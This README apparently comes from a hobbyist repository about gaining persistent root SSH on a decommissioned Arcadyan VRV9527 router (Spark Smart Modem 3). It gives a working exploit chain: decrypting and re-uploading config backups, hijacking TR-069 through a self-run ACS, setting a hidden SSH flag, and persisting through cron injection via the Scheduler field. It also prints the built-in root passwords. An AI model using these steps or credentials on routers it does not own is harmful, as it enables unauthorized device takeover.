# vrv9527-ssh-enable

Method and tools to enable **persistent root SSH** on a decommissioned
**Spark (NZ) Smart Modem 3 (Arcadyan VRV9527, firmware v1.00.08)**.
Intended for hardware you legally own after leaving the ISP.

## Attack chain overview

```
Web admin password
   │
   ▼
Export / decrypt / patch / re-upload config backup
   │          └── point TR-069 ACS at your own machine (ARC_TR69_URL)
   ▼
Minimal CWMP ACS (tools/acs.py)
   │
   ├── ConnectionRequest to force sessions on demand
   │     (digest credentials are in the config backup)
   ├── GetParameterNames to enumerate the data model
   │        └── hidden flag found: Device.X_ARC_COM.SSHEnable (Writable=1)
   ▼
SetParameterValues SSHEnable=1  ──►  port 22 opens, root login
   │
   ▼
Persistence (entirely on-router)
   ├── Problem 1: enabling SSH spawns sshd_delay_close,
   │   a watchdog that kills SSH after 24 hours
   ├── Problem 2: sshd does NOT start at boot
   └── Fix: Scheduler config concatenates "$Time $Command" verbatim
            into the crontab. Set
              ARC_SYS_SCHEDULER_0_Time="*/5 * * * *"   ← injects a valid cron line
              ARC_SYS_SCHEDULER_0_Command=/bin/sh /data/keepssh.sh
            → rebuilt at every boot; /data is a persistent ext4 partition
```

## Prerequisites

- Web admin password for the router
- The **factory main WiFi password** (on the unit's sticker; it is the
  encryption key for config backups)
- A computer on the same LAN (macOS/Linux, Python 3 + openssl + curl)

## Steps

### 1. Export and decrypt the config backup

`tools/vrv.py` logs in and prints a session SID (it replicates the login
page's AES flow). Export `SmartModem_backup.cfg` from the web UI
("System Backup"), then decrypt:

```bash
export VRV_ADMIN_PW='your-admin-password'
SID=$(python3 tools/vrv.py)

# After exporting the backup via the web UI:
python3 tools/arcadyan_util.py -d -p 'factory-wifi-password' SmartModem_backup.cfg outdir
mkdir -p outdir/x && tar xzf outdir/config.tgz -C outdir/x
# main config: outdir/x/config/.glbcfg
```

> `arcadyan_util.py` is a third-party tool from public VRV9517 research
> (redistributed here; VRV9527 uses the same backup format). The openssl
> "deprecated key derivation" warning is harmless.

### 2. Point TR-069 at your own ACS

Edit `.glbcfg`:

```
ARC_TR69_URL=http://<your-computer-IP>:7547/acs
```

Repack the tarball to match the original exactly (uid/gid=0, `.glbcfg`
mode 0666, original member order, GNU tar format), re-encrypt, upload:

```bash
python3 tools/arcadyan_util.py -e -p 'factory-wifi-password' repackdir SmartModem_new.cfg
# upload via the web UI restore page, or:
curl -s http://192.168.1.254/logout.cgi -o /dev/null
python3 tools/vrv_upload.py SmartModem_new.cfg   # response times out — normal, it applied
```

> The restore path sanitizes keys like `ARC_SSHD_ENABLE=1` back to factory
> values (which is why the CWMP detour is needed), but `ARC_TR69_URL` is
> not on the blocklist.

### 3. Run your ACS and take over the CWMP session

```bash
python3 tools/acs.py    # listens on :7547, logs to /tmp/acs_log/
```

The router sends an `Inform` (VALUE CHANGE) as soon as the URL flips.
Later, force a session any time with a ConnectionRequest (credentials are
in `.glbcfg`: `ARC_TR69_Username` / `ARC_TR69_Password`; the listener is on
the WAN IP, reachable from LAN via NAT hairpin):

```bash
curl --digest -u '<ARC_TR69_Username>:<ARC_TR69_Password>' \
     http://<router-WAN-IP>:8081/ConnectionRequest
```

To send an RPC, write it to `/tmp/acs_next.txt` (first line: method name,
rest: body XML). It goes out on the next empty POST of the session.
Enumerate the data model:

```bash
printf 'cwmp:GetParameterNames\n<ParameterPath>Device.</ParameterPath><NextLevel>1</NextLevel>' \
  > /tmp/acs_next.txt
# fire a ConnectionRequest, read the response in /tmp/acs_log/
```

### 4. Open SSH

The enumeration reveals the vendor-hidden `Device.X_ARC_COM.SSHEnable`
(Writable=1):

```bash
cat > /tmp/acs_next.txt <<'EOF'
cwmp:SetParameterValues
<ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[1]"><ParameterValueStruct><Name>Device.X_ARC_COM.SSHEnable</Name><Value xsi:type="xsd:boolean">1</Value></ParameterValueStruct></ParameterList><ParameterKey>ssh-on</ParameterKey>
EOF
curl --digest -u '<ARC_TR69_Username>:<ARC_TR69_Password>' \
     http://<router-WAN-IP>:8081/ConnectionRequest
```

Port 22 opens immediately. Factory-built-in credentials:

```
ssh root@192.168.1.254   # password Spark@Modem3
# second built-in account: rroot / rrs2000RS@)))
```

### 5. Persistence (the crucial part)

Enabling SSH also spawns `sshd_delay_close`, which runs
`mngcli set ARC_SSHD_ENABLE=0` after 24 hours, and sshd does **not** start
at boot even with `ARC_SSHD_ENABLE=1` in flash.

The fix abuses a config quirk: the Scheduler writes its crontab entry by
concatenating `$Time $Command` verbatim. Setting `Time` to a cron
expression produces a valid cron line, and the Scheduler config is
persistent and rebuilt at every boot:

```bash
# on the router, as root:
cp keepssh.sh /data/keepssh.sh   # /data is a persistent ext4 partition
chmod +x /data/keepssh.sh

mngcli set "ARC_SYS_SCHEDULER_0_Command=/bin/sh /data/keepssh.sh"
mngcli set "ARC_SYS_SCHEDULER_0_Time=*/5 * * * *"
mngcli set ARC_SYS_SCHEDULER_0_Enable=1
mngcli commit
```

Result: SSH comes up by itself within 5 minutes of boot; the 24h watchdog
is killed within 5 minutes whenever it appears; sshd is restarted within
5 minutes if it ever dies. No external device required.

Optional hardening: shorten the TR-069 periodic inform and have your ACS
re-enable SSH on every Inform (`tools/acs.py` supports this via the
`/tmp/acs_autossh` flag file):

```bash
# SPV: Device.ManagementServer.PeriodicInformInterval=3600
```

## Files

| File | Purpose |
|---|---|
| `tools/acs.py` | Minimal CWMP (TR-069) ACS: Inform/SPV/GPN/GPV, command queue file `/tmp/acs_next.txt` |
| `tools/vrv.py` | Web login: replicates the spacer-GIF AES key/iv/httoken flow, prints a SID |
| `tools/vrv_upload.py` | Config restore uploader (upload.cgi): login → token → upload in one go |
| `tools/arcadyan_util.py` | Config backup decrypt/encrypt (third-party, from public VRV9517 research) |
| `payload/keepssh.sh` | Router-side SSH keepalive |
| `docs/walkthrough.md` | Full write-up including every dead end (read this before trying your own variants) |

## Gotchas

- After `mngcli set`, always `mngcli commit`. Editing `/etc/config/.glbcfg`
  with `sed` is pointless: commit writes the mng daemon's in-memory config
  and overwrites your edits.
- The restore path (upload.cgi) is picky about the tarball: uid/gid must be
  0 and members must be in the original order, or it instantly fails with
  `G_err=-8` (restore failed).
- `killall sshd` kills your own SSH session; the box has no `setsid`/`nohup`.
  Use cron as the detacher for suicide-and-revive tests.
- Every SSH enable (via CWMP or mngcli) resets `ARC_SSHD_AUTO_DISABLE=1`
  and respawns the 24h watchdog — that's why the keepalive patrols every
  5 minutes.

## Disclaimer

Use this only on hardware you **legally own**. Repointing the ACS disables
the ISP's TR-069 remote management — that is the intended effect. There is
always a risk of bricking; keep both the encrypted backup and a decrypted
copy of `.glbcfg` before you start.
